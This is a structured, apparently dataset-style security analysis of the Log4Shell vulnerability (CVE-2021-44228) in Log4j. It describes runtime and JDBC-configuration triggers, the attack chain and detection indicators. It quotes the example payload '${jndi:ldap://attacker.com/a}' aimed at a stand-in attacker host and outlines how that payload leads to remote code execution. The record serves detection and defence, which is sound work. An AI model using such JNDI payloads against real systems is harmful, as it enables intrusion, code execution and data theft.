package_info.why_malicious: Multiple versions of Log4j contain critical vulnerabilities, most notably CVE-2021-44228 (Log4Shell), which allow attackers to execute arbitrary code remotely by injecting crafted JNDI lookup patterns into log messages or configuration files. These vulnerabilities are easily exploitable, have been weaponized in the wild, and can lead to full system compromise, data exfiltration, or privilege escalation, making affected versions of the package highly dangerous in any environment.

execution_context.trigger: runtime (when a log message is processed)
required_permissions: access to environment variables (for variable resolution)

malicious_snippets.code_behavior: At runtime, when a log message containing a JNDI lookup pattern is processed, the code triggers a JNDI lookup to ldap://attacker.com/a, resulting in an outbound network request and potential remote code execution if the LDAP server responds with a malicious payload.

malice_analysis.why_suspicious: The code allows untrusted log message content to trigger JNDI lookups, enabling attackers to force the application to connect to arbitrary remote servers and potentially load and execute attacker-controlled code.
malice_analysis.violated_expectations: Logging frameworks are expected to treat log message content as inert data and should never execute code or initiate network requests based on log message content.
malice_analysis.similar_legitimate_use: JNDI lookups may be used for resource discovery in trusted, internal environments, but exposing this functionality to untrusted input (such as user-supplied log messages) is never legitimate.
key_indicators: Presence of ${jndi:...} patterns in log messages
Outbound LDAP or RMI requests triggered by log events
Dynamic code loading based on log message content

execution_context.trigger: runtime (when Log4j loads JDBC Appender configuration)

malicious_snippets.code_behavior: At runtime, when Log4j parses the JDBC Appender configuration, the code processes a JNDI URL in the 'url' attribute, triggering a JNDI lookup to ldap://attacker.com/a, which can result in remote code execution if the LDAP server provides a malicious payload.

malice_analysis.why_suspicious: Allowing JNDI lookups in configuration files enables attackers to inject remote resource references, causing the application to connect to and potentially execute code from attacker-controlled servers.
malice_analysis.violated_expectations: JDBC configuration should only accept trusted, static connection strings and must not resolve external resources or execute code based on untrusted input.
malice_analysis.similar_legitimate_use: JNDI-based configuration is sometimes used for dynamic resource resolution in secure, internal deployments, but should never be exposed to untrusted or user-controlled input.
key_indicators: JNDI URL in JDBC Appender configuration
Outbound LDAP or RMI requests initiated during configuration parsing
Potential for code execution via configuration file manipulation

attack_chain.action: Attacker sends a crafted log message or modifies configuration to include a JNDI lookup string (e.g., ${jndi:ldap://attacker.com/a}).
attack_chain.leads_to: The vulnerable Log4j code processes the input and triggers a JNDI lookup.

attack_chain.action: The vulnerable Log4j instance performs an outbound network request to the attacker-controlled LDAP server specified in the JNDI lookup.
attack_chain.leads_to: The attacker can supply a malicious Java class or payload via LDAP.

attack_chain.action: Log4j loads and executes code from the attacker's server as a result of the JNDI lookup, leading to remote code execution within the application context.
attack_chain.leads_to: The attacker gains control over the affected system, enabling data exfiltration, privilege escalation, or further compromise.

behavioral_signatures: Log messages or configuration files containing ${jndi:ldap://...} or similar JNDI patterns
Unexpected outbound LDAP or RMI network requests originating from application servers running Log4j
Dynamic code loading or class instantiation triggered by log message or configuration content
file_indicators: log4j2.xml or other configuration files containing JDBC Appender with JNDI URLs
network_indicators: Outbound LDAP or RMI requests to external or untrusted domains (e.g., attacker.com)
Network connections to domains or IPs specified in JNDI patterns following log or configuration events
detection_knowledge.how_to_detect: Monitor application logs and configuration files for the presence of ${jndi:...} patterns, especially those referencing external LDAP or RMI servers. Inspect network traffic for unexpected outbound LDAP or RMI connections from application servers. Use file integrity monitoring to detect the presence of JndiLookup.class in deployed log4j-core JARs and scan for vulnerable Log4j versions. Employ runtime security monitoring to detect dynamic code loading or execution triggered by log message or configuration content. Correlate log events with network activity to identify exploitation attempts.
